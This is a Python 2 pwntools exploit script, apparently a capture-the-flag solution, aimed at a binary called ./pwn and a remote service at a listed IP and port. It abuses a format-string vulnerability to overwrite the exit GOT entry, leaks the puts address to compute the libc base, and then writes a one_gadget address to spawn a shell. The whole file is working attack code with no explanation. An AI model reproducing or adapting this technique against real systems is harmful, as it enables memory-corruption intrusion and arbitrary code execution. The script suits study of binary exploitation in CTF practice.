#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote('47.97.253.115', 10003)
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

passed = 0

def write_addr(addr, value, tot, index):
    global passed
    addr_ls = [addr, addr + 1, addr + 2, addr + 3, addr + 4, addr + 5]
    value_ls = [value & 0xff, (value >> 8) & 0xff, (value >> 16) & 0xff,
                (value >> 24) & 0xff, (value >> 32) & 0xff, (value >> 40) & 0xff]
    payload = ''
    passed &= 0xff
    for i in range(tot):
        now = (value_ls[i] - passed + 0x100) & 0xff
        if now == 0:
            now = 0x100
        payload += '%{}c%{}$hhn'.format(now, index + i)
        passed = value_ls[i]
    return payload

if __name__ == '__main__':
    p.sla('enter:', '1')
    #gogogo()
    exit_addr = 0x0000000000601060
    main_addr = 0x0000000000400906
    passed = 0
    payload = write_addr(elf.got['exit'], main_addr, 3, 14)
    payload += '.%17$s.'
    payload = payload.ljust(0x30, '\x00') + flat(elf.got['exit'], elf.got['exit'] + 1, elf.got['exit'] + 2, elf.got['puts'])
    #bc(0x00000000004009CB)
    sleep(0.1)
    p.sl(payload)
    #p.sla('guess', payload)
    p.ru('.')
    puts_addr = u64(p.ru('\x7f')[-6:].ljust(8, '\x00'))
    libc.address = puts_addr - libc.sym['puts']
    success('puts ' + hex(puts_addr))
    success('libc ' + hex(libc.address))
    passed = 0
    one_gadget = libc.address + 0xf1147
    payload = write_addr(elf.got['exit'], one_gadget, 6, 20)
    payload = payload.ljust(0x60, '\x00') + flat(elf.got['exit'], elf.got['exit'] + 1, elf.got['exit'] + 2, elf.got['exit'] + 3, elf.got['exit'] + 4, elf.got['exit']+ 5)
    #p.sla('guess', payload)
    p.sla('enter:', '1')
    sleep(0.1)
    bc(one_gadget)
    p.sl(payload)
    p.i()
